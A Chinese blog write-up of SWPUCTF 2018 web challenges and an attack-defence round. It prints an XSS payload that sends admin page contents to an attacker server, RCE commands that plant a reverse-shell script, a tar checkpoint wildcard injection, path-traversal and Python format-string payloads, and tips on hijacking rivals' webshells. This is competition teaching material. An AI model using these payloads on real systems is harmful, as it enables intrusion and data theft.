+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        document.location=&apos;http://vps:1234/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;admin.php&quot;,true);</span><br><span class="line"></span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
+<p>然后在服务器上nc监听</p>
+<p> 发现后台会跳到：/admin/a0a.php?cmd=whoami</p>
+<p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
+<p>进行反弹shell，这样比较利于后续操作，于是改写脚本为</p>
+<p>xmlhttp.open(“GET”,’<a href="http://localhost:6324/admin/a0a.php?cmd=echo%20&quot;xxxxxxxxxxxxx&quot;%20|%20base64%20-d%20&gt;%20/tmp/bak6ry.sh&#39;,true)" target="_blank" rel="noopener">http://localhost:6324/admin/a0a.php?cmd=echo%20&quot;xxxxxxxxxxxxx&quot;%20|%20base64%20-d%20&gt;%20/tmp/bak6ry.sh&#39;,true)</a>;</p>
+<p>向/tmp写入一个bak6ry.sh</p>
+<p>然后</p>
+<p>xmlhttp.open(“GET”,’<a href="http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/bak6ry.sh&#39;,true)" target="_blank" rel="noopener">http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/bak6ry.sh&#39;,true)</a>;</p>
+<p><img src="https://p3.ssl.qhimg.com/t0190eb9882048f3073.png" alt=""></p>
+<p>在/var/www/下发下</p>
+<p><img src="https://p2.ssl.qhimg.com/t01e92949fe430a7f7a.png" alt=""></p>
+<p>发现有个关键的目录</p>
+<p><img src="https://p1.ssl.qhimg.com/t01803b3dee7dd73f92.png" alt=""></p>
+<p>于是访问</p>
+<p><img src="https://p1.ssl.qhimg.com/t01d79ea7fc7dc8e3be.png" alt=""></p>
+<p>然后查看代码</p>
+<p>backup.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;upload.php&quot;);</span><br><span class="line"></span><br><span class="line">echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$sys = &quot;tar -czf z.tar.gz *&quot;;</span><br><span class="line"></span><br><span class="line">chdir($upload_dir);</span><br><span class="line"></span><br><span class="line">system($sys);</span><br><span class="line"></span><br><span class="line">if(file_exists(&apos;z.tar.gz&apos;))&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo &quot;备份文件名: z.tar.gz&quot;;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;未上传文件，无法备份！&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>发现经过tar *处理，于是上传文件</p>
+<p>推荐文章<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">推荐文章</a></p>
+<p>–checkpoint=1</p>
+<p>–checkpoint‐action=exec=sh exp.sh</p>
+<p>exp.sh</p>
+<p>题目是用flag用户进行备份，通过tar让flag用户帮我们执行exp.sh</p>
+<p>exp.sh的内容为</p>
+<p>sky.sh的内容为</p>
+<p>cat /flag | base64</p>
+<p>最终结果</p>
+<p><img src="https://p3.ssl.qhimg.com/t0108329443a01dcee6.png" alt=""></p>
+<p>得到flag:swpuctf{xss_!_tar_exec_instr3st1ng}</p>
+<p>###皇家线上赌场</p>
+<p>os.path.join()函数用于路径拼接文件路径。</p>
+<p>os.path.join()函数中可以传入多个路径：</p>
+<pre><code>会从第一个以”/”开头的参数开始拼接，之前的参数全部丢弃。
+
+以上一种情况为先。在上一种情况确保情况下，若出现”./”开头的参数，会从”./”开头的参数的上一个参数开始拼接。
+</code></pre><p>首先确定：</p>
+<p>1.存在文件包含</p>
+<p>2.有泄露</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost]# tree web</span><br><span class="line"></span><br><span class="line">web/</span><br><span class="line"></span><br><span class="line">├── app</span><br><span class="line"></span><br><span class="line">│   ├── forms.py</span><br><span class="line"></span><br><span class="line">│   ├── __init__.py</span><br><span class="line"></span><br><span class="line">│   ├── models.py</span><br><span class="line"></span><br><span class="line">│   ├── static</span><br><span class="line"></span><br><span class="line">│   ├── templates</span><br><span class="line"></span><br><span class="line">│   ├── utils.py</span><br><span class="line"></span><br><span class="line">│   └── views.py</span><br><span class="line"></span><br><span class="line">├── req.txt</span><br><span class="line"></span><br><span class="line">├── run.py</span><br><span class="line"></span><br><span class="line">├── server.log</span><br><span class="line"></span><br><span class="line">├── start.sh</span><br><span class="line"></span><br><span class="line">└── uwsgi.ini</span><br><span class="line"></span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line"></span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line"></span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line"></span><br><span class="line">    return abort(403)</span><br><span class="line"></span><br><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line"></span><br><span class="line">            return abort(404)</span><br><span class="line"></span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure>
+<p>从目录结构推测出是flask，</p>
+<p>/static?file= 的路由,应该从这里来读取文件</p>
+<p>如下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line"></span><br><span class="line">if filename.find(&apos;..&apos;) != ‐1:</span><br><span class="line"></span><br><span class="line"> return abort(403)</span><br><span class="line"></span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure>
+<p>:</p>
+<p>if filename != ‘/home/ctf/web/app/static/test.js’ and filename.find(‘/home/ctf/web/app’) != ‐1:</p>
+<p> return abort(404)</p>
+<p>这里利用到 os.path.join 函数的一个特性，</p>
+<p>参数中的绝对路径参数前面的所有参数会被忽略</p>
+<p>这里用到了 /proc/self/cwd 目</p>
+<p>录，这个目录指向了当前进程的工作路径，而我在前面给了一个 os.path.join(‘app/static’,</p>
+<p>filename) ，可知当前路径就是源码所在目录，因此构造访问 /static?</p>
+<p>file=/proc/self/cwd/app/views.py ，成功读到文件：</p>
+<p>尝试读取源码 /home/ctf/web_assli3fasdf/app/views.py ，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">from flask_sqlalchemy import SQLAlchemy</span><br><span class="line"></span><br><span class="line">from .views import register_views</span><br><span class="line"></span><br><span class="line">from .models import db</span><br><span class="line"></span><br><span class="line">def create_app():</span><br><span class="line"></span><br><span class="line">    app = Flask(__name__, static_folder=&apos;&apos;)</span><br><span class="line"></span><br><span class="line">    app.secret_key = &apos;9f516783b42730b7888008dd5c15fe66&apos;</span><br><span class="line"></span><br><span class="line">    app.config[&apos;SQLALCHEMY_DATABASE_URI&apos;] = &apos;sqlite:////tmp/test.db&apos;</span><br><span class="line"></span><br><span class="line">    register_views(app)</span><br><span class="line"></span><br><span class="line">    db.init_app(app)</span><br><span class="line"></span><br><span class="line">    return app</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def register_views(app):</span><br><span class="line"></span><br><span class="line">    @app.before_request</span><br><span class="line"></span><br><span class="line">    def reset_account():</span><br><span class="line"></span><br><span class="line">        if request.path == &apos;/signup&apos; or request.path == &apos;/login&apos;:</span><br><span class="line"></span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        uname = username=session.get(&apos;username&apos;)</span><br><span class="line"></span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line"></span><br><span class="line">        if u:</span><br><span class="line"></span><br><span class="line">            g.u = u</span><br><span class="line"></span><br><span class="line">            g.flag = &apos;swpuctf&#123;xxxxxxxxxxxxxx&#125;&apos;</span><br><span class="line"></span><br><span class="line">            if uname == &apos;admin&apos;:</span><br><span class="line"></span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">            now = int(time())</span><br><span class="line"></span><br><span class="line">            if (now - u.ts &gt;= 600):</span><br><span class="line"></span><br><span class="line">                u.balance = 10000</span><br><span class="line"></span><br><span class="line">                u.count = 0</span><br><span class="line"></span><br><span class="line">                u.ts = now</span><br><span class="line"></span><br><span class="line">                u.save()</span><br><span class="line"></span><br><span class="line">                session[&apos;balance&apos;] = 10000</span><br><span class="line"></span><br><span class="line">                session[&apos;count&apos;] = 0</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/getflag&apos;, methods=(&apos;POST&apos;,))</span><br><span class="line"></span><br><span class="line">    @login_required</span><br><span class="line"></span><br><span class="line">    def getflag():</span><br><span class="line"></span><br><span class="line">        u = getattr(g, &apos;u&apos;)</span><br><span class="line"></span><br><span class="line">        if not u or u.balance &lt; 1000000:</span><br><span class="line"></span><br><span class="line">            return &apos;&#123;&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">        field = request.form.get(&apos;field&apos;, &apos;username&apos;)</span><br><span class="line"></span><br><span class="line">        mhash = hashlib.sha256((&apos;swpu++&#123;0.&apos; + field + &apos;&#125;&apos;).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line">        jdata = &apos;&#123;&#123;&quot;&#123;0&#125;&quot;:&apos; + &apos;&quot;&#123;1.&apos; + field + &apos;&#125;&quot;, &quot;hash&quot;: &quot;&#123;2&#125;&quot;&#125;&#125;&apos;</span><br><span class="line"></span><br><span class="line">        return jdata.format(field, g.u, mhas</span><br><span class="line"></span><br><span class="line">h)</span><br></pre></td></tr></table></figure>
+<p>session伪造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&apos;/getflag&apos;, methods=(&apos;POST&apos;,))</span><br><span class="line"></span><br><span class="line">@login_required</span><br><span class="line"></span><br><span class="line">def getflag():</span><br><span class="line"></span><br><span class="line">    u = getattr(g, &apos;u&apos;)</span><br><span class="line"></span><br><span class="line">    if not u or u.balance &lt; 1000000:</span><br><span class="line"></span><br><span class="line">        return &apos;&#123;&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">    field = request.form.get(&apos;field&apos;, &apos;username&apos;)</span><br><span class="line"></span><br><span class="line">    mhash = hashlib.sha256((&apos;swpu++&#123;0.&apos; + field + &apos;&#125;&apos;).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    jdata = &apos;&#123;&#123;&quot;&#123;0&#125;&quot;:&apos; + &apos;&quot;&#123;1.&apos; + field + &apos;&#125;&quot;, &quot;hash&quot;: &quot;&#123;2&#125;&quot;&#125;&#125;&apos;</span><br><span class="line"></span><br><span class="line">    return jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure>
+<p>提示python3.5以及format，不难想到是格式化字符串的漏洞</p>
+<p>推荐链接<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">Python 格式化字符串漏洞</a></p>
+<p>结合__init_.py，我们应该先跳到db，再跳到app</p>
+<p>exp:</p>
+<p>field=<strong>class</strong>.save.<strong>globals</strong>[db].<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[current_app].before_request.<strong>globals</strong></p>
+<p>西南石油师傅举办的公益性比赛，web题的质量真心不错</p>
+<p>接下来是线下赛的总结</p>
+<p>#线下赛总结</p>
+<p>这次线下赛web分为三个环境三个端口四个漏洞</p>
+<ol>
+<li><p>typecho反序列化漏洞</p>
+</li>
+<li><p>tp最新爆出的一个漏洞</p>
+</li>
+</ol>
+<p><a href="https://www.cn-space.com/2018/12/12/1/" target="_blank" rel="noopener">ThinkPHP5多个RCE+文件写入漏洞 </a></p>
+<ol start="3">
+<li><p>易优cms<a href="https://xz.aliyun.com/t/2632" target="_blank" rel="noopener">前台getshell</a></p>
+</li>
+<li><p>phpmyadmin<a href="https://blog.csdn.net/qq_42154484/article/details/80773895" target="_blank" rel="noopener">cve-2018-12613-PhpMyadmin后台文件包含</a></p>
+</li>
+</ol>
+<p>一来被一个队伍改了数据库的弱口令，原因是找网页配置文件时，web1的文件实在太多，找到半天还不是root数据库用户的密码，结果在web2的配置文件里有，因为密码被改导致服务坏掉，所以速度要快</p>
+<ol>
+<li>备份很重要</li>
+</ol>
+<p><code>tar -zcvf /tmp/web.tar.gz /var/www/html</code></p>
+<p>将网页打包放到tmp下命名为web.tar.gz</p>
+<p>3.将所有弱口令密码都修改了，然后再备份一次源码</p>
+<ol start="2">
+<li><p>接着就是上通防御waf，如果不行的话，就把通防waf放漏洞页面，这里犯了一个错，www-data是没有tmp下文件的读写权限的，二我们预先写好的脚本是把包含的waf文件放在tmp下的，生成日志也是放在tmp下，所以一开始看的攻击的流量漫天飞，自己都无法定位攻击者，所以一来防御好很重要，防御的同时可以派一个人乘别人还没把洞补上去多拿点分，然后将次源码备份下来攻击时立马恢复，恢复命令：<code>tar -zxvf /tmp/web.tar.gz</code></p>
+</li>
+<li><p>文件监控很重要，你可以知道哪个地方被写马了，如果没有文件监控可以执行<code>find /var/www/html -name &#39;*.php&#39; -mmin -30 | xargs grep &#39;$_POST&#39;</code>查找30分钟内被修改的包含特定关键字的文件通过别人写木马的地址和参数，可以试试别人是否也被批量上马了，这次我就通过次直接连了被人的webshell</p>
+</li>
+<li><p>被攻击的时候一定不要慌，通过审日志通过别人的攻击流量反打回去是个不错的方式，但是对方可以对你进行大量的流量干扰</p>
+</li>
+<li><p>可以将别人的首页复制粘贴下来放到自己首页上，这样攻击者访问首页的超链接的时候会自动跳转到复制来的网页对应的功能点去，可以减少自己被攻击的频率，当然有可能会被主办方check</p>
+</li>
+<li><p>写一个批量化自动提交flag的脚本在中后期非常关键,可以提前写好一个攻击框架</p>
+</li>
+</ol>
+<p>7.比赛前会有一个网络配置环节。这个可以提前练习一下，速度一定要快，抢先备份最原始无马的源码</p>
+<ol start="8">
+<li><p>可以控制web目录下的权限都为555</p>
+</li>
+<li><p>给自己上一个密码比较复杂的运维马，目的是拥有www-data的权限，好对网页进行修改，清楚不死马等操作</p>
+</li>
+</ol>
+<p>#最后</p>
+<p>最后这次比赛已经办了九届了，很多题的质量确实还是不错的，无论是线上还是线下赛都学习到不少的东西</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://yoursite.com">bak6ry</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/01/03/swpu/">http://yoursite.com/2018/01/03/swpu/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/01/03/swpu/">January 3rd 2018, 3:24:00 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/01/03/swpu/">February 6th 2019, 11:49:26 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/07/23/sctf2018/" title= "sctf2018部分wp">
+                    <div class="nextTitle">sctf2018部分wp</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1183621141@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/bak6ry" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/bak6ry" class="iconfont-archer twitter" target="_blank" title=twitter></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 7
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2018/11/18/hctf马后炮分析/" >hctf马后炮分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2018/09/01/lampiao/" >vulnhub|渗透测试lampiao</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客/" >巅峰极客2018第一场部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/sctf2018/" >sctf2018部分wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2018/01/03/swpu/" >SWPUCTF 2018 Web题和线下赛总结</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="比赛"><span class="iconfont-archer">&#xe60a;</span>比赛</span>
+    
+        <span class="sidebar-category-name" data-categories="靶机"><span class="iconfont-archer">&#xe60a;</span>靶机</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "bak6ry"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
